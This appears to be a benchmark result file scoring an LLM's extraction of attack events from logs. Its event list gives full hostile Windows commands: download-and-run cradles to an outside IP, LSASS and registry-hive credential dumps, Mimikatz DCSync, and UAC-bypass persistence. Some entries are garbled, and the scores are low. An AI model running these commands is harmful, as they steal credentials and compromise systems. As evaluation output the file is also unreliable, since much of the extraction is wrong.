@@ -1,0 +1,164 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\u0106\u03ac\\u0163\\\\u203a\\\udcba\\\u201e'B\\ub110\\u2611\\u2303\\u2122 ps1",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/a C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ahqkiquo.hnx.ps1",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\u0106\u03ac\\u0163\\\\u203a\\\udcba\\\u201e'B\\ub110\\u2611\\u2303\\u2122 ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe';Invoke-AtomicTest T1220  -TestNumbers 1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1003.003",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1548.002 -TestNumbers 2",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\ntds.dit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "reg SAVE hklm\\sam c:\\users\\admini~1\\appdata\\local\\temp\\tthwwf",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "reg SAVE hklm\\security c:\\users\\admini~1\\appdata\\local\\temp\\tjbvkjpetfjp",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "procdump.exe  -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp ",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "lazagne1.exe browsers",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1546.008 -TestNumbers 1 -Cleanup",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1134.001 -TestNumbers 1",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Get-Service > $env:TEMP\\T1119_1.txt Get-ChildItem Env: > $env:TEMP\\T1119_2.txt Get-Process > $env:TEMP\\T1119_3.txt",
+        "stage": "Discovery"
+      },
+      {
+        "command": "reg SAVE hklm\\system c:\\users\\admini~1\\appdata\\local\\temp\\qsdirkg",
+        "stage": "Collection"
+      },
+      {
+        "command": "reg SAVE HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM_HIVE",
+        "stage": "Collection"
+      },
+      {
+        "command": "mimikatz2.exe  lsadump::sam exit",
+        "stage": "Collection"
+      },
+      {
+        "command": "mimikatz.exe  LSADUMP::DCSync exit",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd  /c start /min sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \\\"C:\\Windows\\System32\\cmd.exe\\\" /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C New-Item \\\"HKCU:\\\\Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\\\" -Force New-ItemProperty \\\"HKCU:\\\\Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\\\" -Name \\\"(default)\\\" -Value 'cmd.exe /c notepad.exe' New-ItemProperty \\\"HKCU:\\\\Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\\\" -Name \\\"DelegateExecute\\\" -Value \\\"\\\" -Force Start-Process \\\"C:\\Windows\\System32\\fodhelper.exe\\\"}",
+        "stage": "Persistence"
+      }
+    ],
+    "narrative": "The attacker performed initial access via PowerShell download cradle and HTA file execution, establishing a persistent connection through Sangfor SSL VPN client. Following successful privilege escalation through techniques like Mimikatz and Invoke-atomic tests, the attacker gained unauthorized access to the Active Directory database files. Subsequent actions included extracting credentials, executing commands to capture sensitive system info, and maintaining persistence by creating scheduled tasks and modifying registry keys.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 42496,
+      "completion_tokens": 7739,
+      "total_tokens": 50235,
+      "wall_clock_s": 292.955,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.32142857142857145,
+      "recall": 0.2647058823529412,
+      "f1": 0.2903225806451613,
+      "tp": 9,
+      "fp": 19,
+      "fn": 25
+    },
+    "stage": {
+      "precision": 0.10714285714285714,
+      "recall": 0.08108108108108109,
+      "f1": 0.0923076923076923,
+      "tp": 3,
+      "fp": 25,
+      "fn": 34,
+      "recall_partial": 0.20270270270270271
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 42496,
+      "completion_tokens": 7739,
+      "total_tokens": 50235,
+      "wall_clock_s": 292.955,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
